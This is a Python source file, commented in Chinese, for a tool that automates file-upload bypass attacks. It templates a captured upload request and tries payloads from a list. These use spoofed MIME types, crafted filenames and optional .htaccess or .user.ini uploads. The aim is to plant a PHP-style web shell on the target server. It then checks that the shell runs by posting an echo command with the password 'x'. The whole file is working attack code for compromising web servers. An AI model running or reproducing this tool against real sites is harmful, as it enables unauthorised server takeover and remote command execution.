import socket
import requests
import re
import os
shell_re_chars=15 #根据标记内容的前后10个字符生成正则表达式,如果有多个匹配项请增加该值
receive_size=256000 #接收数据的大小,如果网页较大无法接收到响应包返回的文件url可适当调大

def fmtRequest(requestFilePath):#该函数的作用是格式化请求包,将请求包转换为通用模板,方便插入payload,详见request_template.txt
                                #代码写的比较乱,不仔细看我自己都看不懂...还好实现了功能...
    data=open(requestFilePath,"rb")
    request_template=""
    flag=0
    length=0
    a=data.read().decode(errors="ignore")
    lis=a.split("\r\n")
    for line in lis:
        if flag == 1:
            flag+=1
        if flag == 2:
            if "------" in line:
                flag=0
            else:
                continue
        if "Accept-Encoding" not in line:
            if "Content-Length" not in line:
                if "Content-Type" in line:
                    if "multipart" in line:
                         line=line.replace("multipart","mUltipart")
                    if ";" not in line:
                        line="Content-Type: [[[[upload_type]]]]\r\n\r\n[[[[upload_data]]]]"##
                        flag=1
                request_template+=line+"\r\n"
            else:
                request_template+="Content-Length: [[[[content_length]]]]\r\n"##
    request_template=re.sub(r'filename=\".*\"',r'filename="[[[[upload_name]]]]"',request_template)
    return request_template
  
def fmtResponse(responseFilePath):#该函数的作用是找到你标记的文件url,生成用于匹配该路径的正则表达式(取[[[[...]]]]前后10个字符,中间为.*)
    data=open(responseFilePath,"rb")
    a=data.read().decode(errors="ignore")
    shell_re_left=a[a.find("[[[[")-shell_re_chars:a.find("[[[[")]
    shell_re_right=a[a.find("]]]]")+4:a.find("]]]]")+4+shell_re_chars]
    shell_re=shell_re_left+".*"+shell_re_right
    return shell_re
    
def uploadAttachment(host,port,request_template,attachmentPath,attachmentType,https=False): #上传.htaccess或.user.ini到服务器
    request_template=request_template.replace("[[[[upload_type]]]]","image/jpeg")#逐一替换模板内容
    if attachmentType=="1":
        request_template=request_template.replace("[[[[upload_name]]]]",".htaccess")
    if attachmentType=="2":
        request_template=request_template.replace("[[[[upload_name]]]]",".user.ini")
    body=request_template[request_template.find("\n------WebKitFormBoundary"):]
    left=request_template[0:request_template.find("[[[[upload_data]]]]")]
    right=request_template[request_template.find("[[[[upload_data]]]]")+19:]
    left=left.replace("[[[[content_length]]]]",str(len(body)+os.path.getsize(attachmentPath)-21))#计算content_length
    f=open(attachmentPath,"rb")
    request_data=left.encode()+f.read()+right.encode()
    sock = socket.socket()
    sock.connect((url,int(port)))
    sock.send(request_data)
    sock.recv(receive_size)
        
def sendPayload(host,port,request_template,payload,shell_re,base_url,https=False,custom_Y="",custom_N=""):#该函数用于替换模板并发送请求到服务器
    tmp=payload.split("||||")#分割每一项
    name=tmp[0]
    mimeType=tmp[1]
    shellPath=tmp[2][1:-1]
    shellType=tmp[3]
    remoteName=tmp[4]
    attachmentType=tmp[5]
    attachmentPath=tmp[6][1:-1]
    extension=tmp[7]
    
    if attachmentType!="0":#判断在上传文件前是否需要上传.htaccess或.user.ini
        #if custom_Y != "" or custom_N != "":#如果有自定义条件不发送需要上传附加文件的payload
        #    return False
        uploadAttachment(host,port,request_template,attachmentPath,attachmentType)
    #逐一替换模板内容
    request_template=request_template.replace("[[[[upload_type]]]]",mimeType)
    request_template=request_template.replace("[[[[upload_name]]]]",remoteName)
    body=request_template[request_template.find("\n------WebKitFormBoundary"):]
    left=request_template[0:request_template.find("[[[[upload_data]]]]")]
    right=request_template[request_template.find("[[[[upload_data]]]]")+19:]
    left=left.replace("[[[[content_length]]]]",str(len(body)+os.path.getsize(shellPath)-21))
    f=open(shellPath,"rb")
    request_data=left.encode()+f.read()+right.encode()

    print("\r[正在测试]"+name)
    sock = socket.socket()#socket方式连接服务器,发送请求
    sock.connect((url,int(port)))
    sock.send(request_data)
    data=bytes("","utf-8")
    
    data = data + sock.recv(receive_size)
    tmp=data.decode(errors="ignore")
    if custom_Y !="":#如果有自定义条件则对自定义条件的满足性进行判断,逻辑比较复杂,无法处理&和|同时存在的情况....
        if "|" in custom_Y:
            Y=custom_Y.split("|")
            flag=False
            for i in Y:
                if i in tmp:
                    flag=True
                    break
            if flag==True:
                print("\r[成功]满足自定义条件\n")
                print("======response======")
                print(tmp)
                print("======response======\n")
                write_file("custom_response.txt",tmp)
                return True
            else:
                print("\r[失败]"+name+"\n[原因]不满足自定义条件\n")
                return False
        if "&" in custom_Y:
            Y=custom_Y.split("&")
            flag=True
            for i in Y:
                if i not in tmp:
                    flag=False
                    break
            if flag==True:
                print("\r[成功]满足自定义条件\n")
                print("======response======")
                print(tmp)
                print("======response======\n")
                write_file("custom_response.txt",tmp)
                return True
            else:
                print("\r[失败]"+name+"\n[原因]不满足自定义条件\n")
                return False
        if ("|" not in custom_Y) and ("&" not in custom_Y):
            if custom_Y in tmp:
                print("\r[成功]满足自定义条件\n")
                print("======response======")
                print(tmp)
                print("======response======\n")
                write_file("custom_response.txt",tmp)
                return True
            else:
                print("\r[失败]"+name+"\n[原因]不满足自定义条件\n")
                return False
    if custom_N !="":
        if "|" in custom_N:
            N=custom_N.split("|")
            flag=False
            for i in N:
                if i not in tmp:
                    flag=True
                    break
            if flag==True:
                print("\r[成功]满足自定义条件\n")
                print("======response======")
                print(tmp)
                print("======response======\n")
                write_file("custom_response.txt",tmp)
                return True
            else:
                print("\r[失败]"+name+"\n[原因]不满足自定义条件\n")
                return False
        if "&" in custom_N:
            N=custom_N.split("&")
            flag=True
            for i in N:
                if i in tmp:
                    flag=False
                    break
            if flag==True:
                print("\r[成功]满足自定义条件\n")
                print("======response======")
                print(tmp)
                print("======response======\n")
                write_file("custom_response.txt",tmp)
                return True
            else:
                print("\r[失败]"+name+"\n[原因]不满足自定义条件\n")
                return False
        if ("|" not in custom_N) and ("&" not in custom_N):
            if custom_N not in tmp:
                print("\r[成功]满足自定义条件\n")
                print("======response======")
                print(tmp)
                print("======response======\n")
                write_file("custom_response.txt",tmp)
                return True
            else:
                print("\r[失败]"+name+"\n[原因]不满足自定义条件\n")
                return False
    match=re.findall(shell_re,tmp)#从响应包的内容中匹配上传文件的url,如果匹配不到说明上传失败
    if match == []:
        print("\r[失败]"+name+"\n[原因]无法上传\n")
        return False
    else:
        shell_url=match[0][shell_re_chars:-shell_re_chars]#删去多余的前后字符
        shell_name=shell_url[shell_url.rfind("/")+1:]#取出服务器返回的文件名
        
        if extension != "[AUTO]":#如果指定了扩展名则对文件扩展名进行更改
            shell_name=shell_name[0:shell_name.find(".")]+extension

        if "[[]]" in base_url:#如果指定了base_url则将[[]]替换为文件名即可
            shell_url=base_url.replace("[[]]",shell_name)
        else:
            if ("http://" in shell_url) or ("https://" in shell_url):#判断响应包返回的是绝对路径还是相对路径
                shell_url=shell_url[0:shell_url.rfind("/")+1]+shell_name
            else:
                shell_url=base_url+shell_url[0:shell_url.rfind("/")+1]+shell_name

        if check(shell_url) ==True:
            print("\r[成功]上传："+shell_name+"\n[shell_url]["+shell_url+"]")
            match=[]
            return True
        else:
            print("\r[失败]"+name+"\n[原因]上传成功，但服务器无法解析\n[shell_url]["+shell_url+"]\n")
            return False

def check(target_url):#检查是否可以正常解析
    dat={"x":"echo \"@@@@@@@@@@\";"}#shell的密码为x,如果需要修改shell密码请注意修改这里
    a=requests.post(target_url,data=dat)
    if "@@@@@@@@@@" in a.text:
        return True
    else:
        return False

def write_file(filepath,content):
    with open(filepath,'w') as f:
        f.write(content)
        f.close()

if __name__ == '__main__':

    #暂时先用这种方式传参,后续再增加命令行方式传参

    
    requestFilePath="request.txt"                    #请求包文件路径,brup抓包,repeater->copy to file
    
    responseFilePath="response.txt"                   #响应包文件路径,burp抓包,repeater->copy to file,用[[[[]]]]标记响应包中返回的上传文件的路径
    
    https=False                            #网站是否开启https,默认关闭
    
    base_url=""                            #该变量为正常文件上传成功时的完整url路径,为空时程序自动判断(http(s)://+host+port+请求头+响应包返回的url)
                                           #例：上传成功后文件url：http://www.xxx.com/upload/1.jpg,此时该变量写：http://www.xxx.com/upload/[[]]
    
    custom_Y=""                            #自定义条件,可空,在逐条验证payload时,如果返回包存在custom_Y中的一个或多个内容,则判定通过,不再验证下一条payload,条件之间可用&或|连接,但不可同时出现
    
    custom_N=""                            #自定义条件,可空,在逐条验证payload时,如果返回包不存在custom_N中的一个或多个内容,则判定通过,不再验证下一条payload,条件之间可用&或|连接,但不可同时出现

    #custom_Y和custom_N不可同时非空,&和|不可同时出现,不支持逻辑括号及其嵌套(本人能力有限,写不了那么复杂的逻辑判断....)

    #后续会加入重定向跟随选项（适用条件：文件上传成功后跳转到新的网页才返回上传结果）,响应包如果出现重定向,程序自动跟随地址，并取出重定向地址的文件url





    request_template=fmtRequest(requestFilePath)
    if custom_Y == "" and custom_N == "":#没有自定义条件时则读取响应包,生成正则表达式
        shell_re=fmtResponse(responseFilePath)
    else:
        shell_re=""
    host=re.findall("Host: .*\r\n",request_template)[0][6:-2]#从请求包中取出服务器的域名或ip以及端口
    if ':' in host:
        url=host.split(":")[0]
        port=host.split(":")[1]
    else:
        url=host
        if https==True:
            port="443"
        else:
            port="80"
    if base_url=="":#没有指定base_url时程序将自动判断,http(s)://+host+:+port+请求头
        tmp=request_template[request_template.find("POST ")+5:request_template.find("HTTP/")-1]
        if https==False:
            base_url="http://"+url+":"+port+tmp[0:tmp.rfind("/")+1]
        else:
            base_url="https://"+url+":"+port+tmp[0:tmp.rfind("/")+1]
    print("[base_url]["+base_url+"[file_name]]")
    f=open("payload.txt","r")
    lis=f.read().split("\n")
    for i in range(0,len(lis)-1):
        payload=lis[i]
        if payload[0]=='#':#去除注释
            continue
        result=sendPayload(host,port,request_template,payload,shell_re,base_url,https,custom_Y,custom_N)
        if result==True:
            break
        
